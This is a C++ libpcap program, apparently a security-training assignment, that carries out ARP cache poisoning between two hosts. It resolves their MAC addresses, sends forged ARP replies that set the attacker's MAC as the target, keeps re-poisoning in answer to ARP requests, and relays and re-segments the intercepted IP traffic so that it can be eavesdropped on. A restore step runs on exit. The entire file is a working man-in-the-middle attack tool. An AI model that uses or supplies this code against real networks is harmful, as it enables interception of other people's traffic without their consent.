//20220824 BoB 11th 이예찬
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <string.h>
#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <vector>
#include <pthread.h>
#include <signal.h>
#define MAX_PACKET_SIZE 15000
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Iphdr {
	u_char ip_vhl;		/* version << 4 | header length >> 2 */
	u_char ip_tos;		/* type of service */
	u_short ip_len;		/* total length */
	u_short ip_id;		/* identification */
	u_short ip_off;		/* fragment offset field */
	u_char ip_ttl;		/* time to live */
	u_char ip_p;		/* protocol */
	u_short ip_sum;		/* checksum 10-11*/
	Ip ip_src;
	Ip ip_dst;
};
#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

typedef struct Host {
	Ip ip;
	Mac mac;
} Host ;

typedef struct Flow{
	Ip sender_ip;
	Mac sender_mac;
	Ip target_ip;
	Mac target_mac;
} Flow; 

struct tcp {
	u_short th_sport;	/* source port */
	u_short th_dport;	/* destination port */
	u_int th_seq;		/* sequence number */
	u_int th_ack;		/* acknowledgement number */
	u_char th_offx2;	/* data offset, rsvd */
#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
	u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win;		/* window */
	u_short th_sum;		/* checksum */
	u_short th_urp;		/* urgent pointer */
};

vector<Flow> flows;
pcap_t* handle = NULL;

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.0.5 192.168.0.1 192.168.0.1 192.168.0.5\n");
}

Mac getMacFromIp(Host* me, Ip* sender){
	u_short TIMEOUT = 3;
	u_short MAX_ATTEMPT= 5;
	u_short fail_count = 0;
	time_t lastSendTime = 0;
	time_t spendTime = 0;
	time(&lastSendTime);
	while(1){
		if(fail_count >= MAX_ATTEMPT){
			cout << "[getMacFromIp] Can't Find IP " << string(*sender) << ", Waiting for " << TIMEOUT << "s, Number of Attemps : " << MAX_ATTEMPT << endl;
			exit(1);
		}
		EthArpPacket packet;
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = me->mac;
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = me->mac;
		packet.arp_.sip_ = htonl(me->ip);
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(*sender);

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "[getMacFromIp] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		while (1) {
			time(&spendTime);
			if(lastSendTime + TIMEOUT <= spendTime){
				cout << "[getMacFromIp] No ARP Reply From " << string(*sender) << ", Wating : " << TIMEOUT << "s, Retry Times : " << fail_count << endl;
				lastSendTime = spendTime;
				fail_count++;
				break;
			}
			struct pcap_pkthdr* header;
			const u_char* tmp_packet;
			int res = pcap_next_ex(handle, &header, &tmp_packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				fprintf(stderr, "[getMacFromIp] pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
				exit(1);
			}
			struct EthArpPacket *eth_arp_packet = (struct EthArpPacket *)tmp_packet;
			if(eth_arp_packet->eth_.type() != EthHdr::Arp)
				continue;
			if(eth_arp_packet->arp_.op() != ArpHdr::Reply)
				continue;
			if(eth_arp_packet->arp_.sip() == *sender && eth_arp_packet->arp_.tmac() == me->mac){
				return eth_arp_packet->arp_.smac();
			}
		}
	}
}

Host getMyNetworkInfo(char* dev){
	Host tmp;
	ifstream iface("/sys/class/net/" + string(dev) + "/address");
	tmp.mac = Mac(string((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>()));
	
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	memcpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	tmp.ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
	return tmp;
}

void SendArpReply(Flow * flow_obj){
	EthArpPacket packet;

	packet.eth_.dmac_ = flow_obj->sender_mac;
	packet.eth_.smac_ = flow_obj->target_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = flow_obj->target_mac;
	packet.arp_.sip_ = htonl(flow_obj->target_ip);
	packet.arp_.tmac_ = flow_obj->sender_mac;
	packet.arp_.tip_ = htonl(flow_obj->sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "[SendArpReply] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(1);
	}
}

void sig_handler(int sig){
	printf("\n[sig_handler] ARP Recovery START\n");
	//ARP Recovery Step
	for (int i = 0; i < 2;  i++) {
		SendArpReply(&(flows.at(i)));
	}
	printf("[sig_handler] ARP Recovery Complete.\n");
	printf("[sig_handler] User Terminates Program\n");
  	exit(0) ;
}
uint16_t CalcIPChecksum(u_char * arr, int size){
	uint32_t check_sum = 0;
	for(int i = 0; i < size / 2; i++){
		uint16_t tmp;
		memcpy(&tmp, arr + (i*2), 2);
		check_sum += tmp;
	}
	uint32_t carry = ((0xFFFF0000 & check_sum) >> 16);
	return ((check_sum + carry) ^ 0xFFFF);
}

/* Reference : https://gist.github.com/david-hoze/0c7021434796997a4ca42d7731a7073a */
/* set tcp checksum: given IP header and tcp segment */
void compute_tcp_checksum(struct Iphdr *pIph, unsigned short *ipPayload) {
    unsigned long sum = 0;
    unsigned short tcpLen = ntohs(pIph->ip_len) - IP_HL(pIph)*4;
    struct tcp *tcphdrp = (struct tcp*)(ipPayload);
    //add the pseudo header 
    //the source ip
    sum += (pIph->ip_src>>16)&0xFFFF;
    sum += (pIph->ip_src)&0xFFFF;
    //the dest ip
    sum += (pIph->ip_dst>>16)&0xFFFF;
    sum += (pIph->ip_dst)&0xFFFF;
    //protocol and reserved: 6
    sum += htons(IPPROTO_TCP);
    //the length
    sum += htons(tcpLen);
 
    //add the IP payload
    //initialize checksum to 0
    tcphdrp->th_sum = 0;
    while (tcpLen > 1) {
        sum += * ipPayload++;
        tcpLen -= 2;
    }
    //if any bytes left, pad the bytes and add
    if(tcpLen > 0) {
        //printf("+++++++++++padding, %dn", tcpLen);
        sum += ((*ipPayload)&htons(0xFF00));
    }
      //Fold 32-bit sum to 16 bits: add carrier to result
      while (sum>>16) {
          sum = (sum & 0xffff) + (sum >> 16);
      }
      sum = ~sum;
    //set computation result
    tcphdrp->th_sum = (unsigned short)sum;
}
void RelayJumboFrame(const u_char* packet, EthArpPacket *eth_hdr){
	u_char data[MAX_PACKET_SIZE];				//copy of packet
	u_char relayData[1515];						//Actually Send Data
	memcpy(data, packet, MAX_PACKET_SIZE);		//copy packet data to static data array
	memcpy(relayData, packet, 54);				//copy packet data to static data array
	memcpy(relayData, eth_hdr, 14);				//copy ethernet + ip header to ralaydata array

	struct Iphdr *ip_hdr = (struct Iphdr*) (relayData + 14);
	u_int size_ip = IP_HL(ip_hdr)*4;
	struct tcp *tcp_hdr = (struct tcp*)(relayData + 14 + size_ip);
	u_int size_tcp = TH_OFF(tcp_hdr)*4; 
	u_int payload_size = ntohs(ip_hdr->ip_len) - size_ip - size_tcp;
	tcp_hdr->th_offx2 = 0x50;		//Set TCP Header Length = 20byte
	uid_t tcp_sequence_base = ntohl(tcp_hdr->th_seq);
	u_int packet_offset = 0;
	u_int left_payload_size = payload_size;

	while(left_payload_size > 0){
		//set IP Header total length, checksum, TCP Header Checksum
		int read_size = ((left_payload_size >= 1460) ? (1460) : left_payload_size);
		tcp_hdr->th_seq = htonl(tcp_sequence_base + packet_offset);
		ip_hdr->ip_len = htons(read_size + 40);
		memcpy(relayData + 54, data + 54 + packet_offset, read_size);

		ip_hdr->ip_sum = 0;
		ip_hdr->ip_sum = CalcIPChecksum(relayData + 14, 20);

		compute_tcp_checksum(ip_hdr, (u_short *)(relayData + 14 + size_ip));
			 
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(relayData),  read_size + 54);
		if (res != 0) {
			fprintf(stderr, "[main_Relay] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		left_payload_size -= read_size;
		packet_offset += read_size;
	}
}

int main(int argc, char* argv[]) {
	if (argc != 6) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	handle = pcap_open_live(dev, MAX_PACKET_SIZE, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "[main] couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Host MY_NETWROK = getMyNetworkInfo(dev);

	//flows 0,1 index : 정상적인 Flow, 2,3 index : attacker가 ARP에 사용하는 Flow
	for(int i = 0; i < 2; i++){
		Flow tmp;
		tmp.sender_ip = Ip(argv[2+(i*2)]);
		tmp.sender_mac = getMacFromIp(&MY_NETWROK, &tmp.sender_ip);
		tmp.target_ip = Ip(argv[3+(i*2)]);
		tmp.target_mac = getMacFromIp(&MY_NETWROK, &tmp.target_ip);
		flows.push_back(tmp);
	}

	for(int i = 0; i < 2; i++){
		Flow tmp = flows.at(i);
		tmp.target_mac = MY_NETWROK.mac;
		flows.push_back(tmp);
		SendArpReply(&tmp); 	//초기 ARP 테이블 변조
	}

	//사용자가 Ctrl + c 를 누를 경우, Sender, Target ARP 복구 및 프로그램 종료
	signal(SIGINT, sig_handler);
	
	// vector<Flow>::iterator iter; // vector 반복자 iter 선언. Flow 백터 확인용
	// for (iter = flows.begin(); iter != flows.end(); iter++) {
	// 	cout << string(iter->sender_ip) << endl;
	// 	cout << string(iter->sender_mac) << endl;
	// 	cout << string(iter->target_ip) << endl;
	// 	cout << string(iter->target_mac) << endl<<endl;
	// }
	struct pcap_pkthdr* header;
	const u_char* packet;
	u_char relayData[1515];
	int res;

	while (1) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("[main] pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(1);
		}

		struct EthArpPacket *eth_hdr = (struct EthArpPacket *)packet;

		if(eth_hdr->eth_.smac() != flows.at(0).sender_mac && eth_hdr->eth_.smac() != flows.at(1).sender_mac)
			continue;
		
		if(eth_hdr->eth_.type() == EthHdr::Arp){	//ARP 패킷만 담당

			//공격 대상만 처리
			if(eth_hdr->arp_.tip() != MY_NETWROK.ip && eth_hdr->arp_.tip() != flows.at(0).sender_ip && eth_hdr->arp_.tip() != flows.at(1).sender_ip)
				continue;

			//ARP Request를 보낸 Sender에 맞는 Attacker IP와 MAC주소를 찾고, 이를 이용해 Reply 전송
			for (int i = 2; i < 4; i++) {
				if(flows.at(i).sender_mac != eth_hdr->eth_.smac())
					continue;
				if(eth_hdr->eth_.dmac().isBroadcast()){
					sleep(0.2); //딜레이가 없을 경우 Sender에게 Target보다 먼저 Reply가 도착할 수 있음.
				}
				SendArpReply(&(flows.at(i)));
				break;
			}
		}
		else{
			//Packet Relay
			if(eth_hdr->eth_.type() != EthHdr::Ip4)
				continue;

			if(eth_hdr->eth_.dmac() != MY_NETWROK.mac)
				continue;

			struct Iphdr *ip = (struct Iphdr *) (packet + 14);
			uint packet_size = ntohs(ip->ip_len) + 14;

			for (int i = 0; i < 2; i++) {
				if(eth_hdr->eth_.smac() == flows.at(i).sender_mac){
					eth_hdr->eth_.dmac_ = flows.at(i).target_mac;
					break;
				}
			}
			
			cout << "[main_Relay] " << string(eth_hdr->eth_.smac()) << " -> " << string(eth_hdr->eth_.dmac()) << ", length : " << packet_size  << endl;
			
			eth_hdr->eth_.smac_ = MY_NETWROK.mac;
			
			if(packet_size > 1514){
				RelayJumboFrame(packet, eth_hdr);
				continue;
			}

			memcpy(relayData, packet, packet_size);
			memcpy(relayData, eth_hdr, 14);

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(relayData), packet_size);
			if (res != 0) {
				fprintf(stderr, "[main_Relay] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}
	}

	pcap_close(handle);
	
}